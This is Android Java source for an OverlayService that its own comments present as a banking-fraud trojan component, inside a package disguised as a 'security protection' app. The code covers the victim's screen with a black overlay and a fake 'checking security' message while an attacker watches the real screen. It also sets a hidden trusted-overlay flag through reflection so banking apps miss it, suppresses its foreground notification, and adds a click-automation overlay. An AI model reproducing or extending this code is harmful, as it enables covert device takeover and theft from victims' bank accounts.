package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.TextView;

/**
 * OverlayService
 *
 * TELA PRETA: esconde a tela da vitima.
 *   - usa TYPE_ACCESSIBILITY_OVERLAY (nao entra no takeScreenshot do servico de acessibilidade,
 *     entao o atacante continua vendo a tela real enquanto a vitima ve preto)
 *   - usa PRIVATE_FLAG_TRUSTED_OVERLAY (bancos nao acusam "app por cima")
 *
 * OVERLAY TRANSPARENTE: auxilia a automacao de cliques. Usa views/params PROPRIOS,
 * para nao derrubar a tela preta.
 */
public class OverlayService extends Service {

    private static final String TAG = "OverlayService";

    public static final String ACTION_BLACK_ON     = "BLACK_SCREEN_ON";
    public static final String ACTION_BLACK_OFF    = "BLACK_SCREEN_OFF";
    public static final String ACTION_AUTO_CLICK   = "ACTION_AUTO_CLICK_ACCESSIBILITY";
    public static final String ACTION_SET_OPACITY  = "com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY";
    public static final String ACTION_TOGGLE_TOUCH = "com.seguranca.protecao.TOGGLE_BLACK_SCREEN_TOUCH";

    private WindowManager wm;

    private View blackView;
    private WindowManager.LayoutParams blackParams;
    private boolean blackShowing = false;
    private int blackOpacity = 100;
    private boolean blackBlockTouch = false;

    private View clickView;
    private WindowManager.LayoutParams clickParams;
    private boolean clickShowing = false;

    private BroadcastReceiver ctrlReceiver = null;

    @Override
    public void onCreate() {
        super.onCreate();
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        registerCtrlReceiver();
        Log.d(TAG, "onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        satisfyForeground();
        registerCtrlReceiver();
        if (intent != null) {
            String a = intent.getAction();
            Log.d(TAG, "onStartCommand action=" + a);

            if (intent.hasExtra("opacity")) {
                blackOpacity = clamp(intent.getIntExtra("opacity", blackOpacity));
            }
            if (intent.hasExtra("value")) {
                blackOpacity = clamp(intent.getIntExtra("value", blackOpacity));
            }
            if (intent.hasExtra("blocked")) {
                blackBlockTouch = intent.getBooleanExtra("blocked", blackBlockTouch);
            }

            if (ACTION_BLACK_ON.equals(a)) {
                showBlackScreen();
            } else if (ACTION_BLACK_OFF.equals(a)) {
                hideBlackScreen();
            } else if (ACTION_AUTO_CLICK.equals(a)) {
                showTransparentOverlay();
            } else if (intent.hasExtra("opacity") || intent.hasExtra("blocked")) {
                applyBlackAppearance();
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy");
        try { if (ctrlReceiver != null) unregisterReceiver(ctrlReceiver); } catch (Throwable ignored) {}
        ctrlReceiver = null;
        hideBlackScreen();
        hideTransparentOverlay();
        super.onDestroy();
    }

    private int clamp(int v) { return Math.max(0, Math.min(100, v)); }

    /** [KRYPTOS] cumple el requisito de startForegroundService sin dejar notificacion */
    private void satisfyForeground() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationManager nm =
                        (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null && nm.getNotificationChannel("kryptos_overlay") == null) {
                    android.app.NotificationChannel ch = new android.app.NotificationChannel(
                            "kryptos_overlay", "Servico do sistema",
                            android.app.NotificationManager.IMPORTANCE_MIN);
                    ch.setShowBadge(false);
                    nm.createNotificationChannel(ch);
                }
                startForeground(4712, new android.app.Notification.Builder(this, "kryptos_overlay")
                        .setSmallIcon(android.R.drawable.ic_menu_view).build());
            } else {
                startForeground(4712, new android.app.Notification.Builder(this)
                        .setSmallIcon(android.R.drawable.ic_menu_view).build());
            }
            if (Build.VERSION.SDK_INT >= 24) stopForeground(false);
            else stopForeground(false);
        } catch (Throwable e) {
            Log.w(TAG, "satisfyForeground: " + e);
        }
    }

    // ============================ TELA PRETA ============================

    private void showBlackScreen() {
        if (blackShowing && blackView != null) {
            applyBlackAppearance();
            return;
        }
        try {
            FrameLayout container = new FrameLayout(this);
            container.setBackgroundColor(Color.BLACK);

            TextView tv = new TextView(this);
            tv.setText("Verificando seguranca...\nAguarde alguns instantes");
            tv.setTextSize(20);
            tv.setTextColor(Color.WHITE);
            tv.setGravity(Gravity.CENTER);
            tv.setLineSpacing(8, 1.1f);
            container.addView(tv, new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    Gravity.CENTER));

            blackView = container;

            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    pickOverlayType(),
                    baseFlags(),
                    PixelFormat.TRANSLUCENT);

            p.gravity = Gravity.TOP | Gravity.START;
            p.x = 0;
            p.y = 0;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                p.layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                p.setFitInsetsTypes(0);
            }
            applyTrustedOverlay(p);

            blackParams = p;
            applyBlackAppearance();

            addOverlaySafe(blackView, blackParams, "TELA_PRETA");
            blackShowing = true;
            Log.d(TAG, "TELA PRETA ON type=" + blackParams.type + " alpha=" + blackParams.alpha);
        } catch (Exception e) {
            Log.e(TAG, "Erro tela preta: " + e);
            blackView = null;
            blackParams = null;
            blackShowing = false;
        }
    }

    private void applyBlackAppearance() {
        if (blackParams == null) return;
        blackParams.alpha = clamp(blackOpacity) / 100f;
        if (blackBlockTouch) {
            blackParams.flags &= ~WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
        } else {
            blackParams.flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
        }
        if (blackShowing && blackView != null) {
            try { wm.updateViewLayout(blackView, blackParams); } catch (Throwable ignored) {}
        }
    }

    private void hideBlackScreen() {
        if (!blackShowing && blackView == null) return;
        try { if (blackView != null) wm.removeView(blackView); } catch (Throwable ignored) {}
        blackView = null;
        blackParams = null;
        blackShowing = false;
        Log.d(TAG, "TELA PRETA OFF");
    }

    // ===================== OVERLAY TRANSPARENTE =====================

    private void showTransparentOverlay() {
        try {
            hideTransparentOverlay();

            FrameLayout v = new FrameLayout(this);
            v.setBackgroundColor(Color.TRANSPARENT);
            clickView = v;

            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    pickOverlayType(),
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                    PixelFormat.TRANSLUCENT);

            p.gravity = Gravity.TOP | Gravity.START;
            p.x = 0;
            p.y = 0;
            p.alpha = 1.0f;
            applyTrustedOverlay(p);

            clickParams = p;
            addOverlaySafe(clickView, clickParams, "TRANSPARENTE");
            clickShowing = true;
            Log.d(TAG, "OVERLAY TRANSPARENTE ON type=" + clickParams.type);

            clickView.postDelayed(new Runnable() {
                @Override public void run() { hideTransparentOverlay(); }
            }, 5000);
        } catch (Exception e) {
            Log.e(TAG, "Erro overlay transparente: " + e);
            clickView = null;
            clickParams = null;
            clickShowing = false;
        }
    }

    private void hideTransparentOverlay() {
        if (!clickShowing && clickView == null) return;
        try { if (clickView != null) wm.removeView(clickView); } catch (Throwable ignored) {}
        clickView = null;
        clickParams = null;
        clickShowing = false;
        Log.d(TAG, "OVERLAY TRANSPARENTE OFF");
    }

    // ============================ HELPERS ============================

    private int pickOverlayType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            return WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }
        return WindowManager.LayoutParams.TYPE_PHONE;
    }

    private int baseFlags() {
        return WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_FULLSCREEN;
    }

    private void addOverlaySafe(View v, WindowManager.LayoutParams p, String tag) throws Exception {
        try {
            wm.addView(v, p);
        } catch (Exception e) {
            Log.w(TAG, "addView falhou (" + tag + " type=" + p.type + "): " + e);
            if (p.type == WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY) {
                p.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                wm.addView(v, p);
                Log.w(TAG, "ATENCAO: caiu no fallback TYPE_APPLICATION_OVERLAY (" + tag + ")");
            } else {
                throw e;
            }
        }
    }

    private void applyTrustedOverlay(WindowManager.LayoutParams params) {
        try {
            java.lang.reflect.Field pf = WindowManager.LayoutParams.class.getDeclaredField("privateFlags");
            pf.setAccessible(true);
            java.lang.reflect.Field tf = WindowManager.LayoutParams.class.getDeclaredField("PRIVATE_FLAG_TRUSTED_OVERLAY");
            tf.setAccessible(true);
            int cur = pf.getInt(params);
            int trusted = tf.getInt(null);
            pf.setInt(params, cur | trusted);
        } catch (Throwable ignored) {}
    }

    private void registerCtrlReceiver() {
        if (ctrlReceiver != null) return;
        ctrlReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent it) {
        try { AccessibilityKeeper.garantir(ctx); AccessibilityKeeper.agendar(ctx); AccessibilityKeeper.startLoop(ctx); } catch (Throwable t) {}
                if (it == null || it.getAction() == null) return;
                String a = it.getAction();
                if (ACTION_SET_OPACITY.equals(a)) {
                    int op = it.hasExtra("value") ? it.getIntExtra("value", blackOpacity)
                                                  : it.getIntExtra("opacity", blackOpacity);
                    blackOpacity = clamp(op);
                    applyBlackAppearance();
                    Log.d(TAG, "opacidade=" + blackOpacity);
                } else if (ACTION_TOGGLE_TOUCH.equals(a)) {
                    blackBlockTouch = it.getBooleanExtra("blocked", !blackBlockTouch);
                    applyBlackAppearance();
                    Log.d(TAG, "blockTouch=" + blackBlockTouch);
                }
            }
        };
        IntentFilter f = new IntentFilter();
        f.addAction(ACTION_SET_OPACITY);
        f.addAction(ACTION_TOGGLE_TOUCH);
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(ctrlReceiver, f, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(ctrlReceiver, f);
            }
            Log.d(TAG, "receiver registrado");
        } catch (Exception e) {
            Log.w(TAG, "reg receiver: " + e);
            ctrlReceiver = null;
        }
    }
}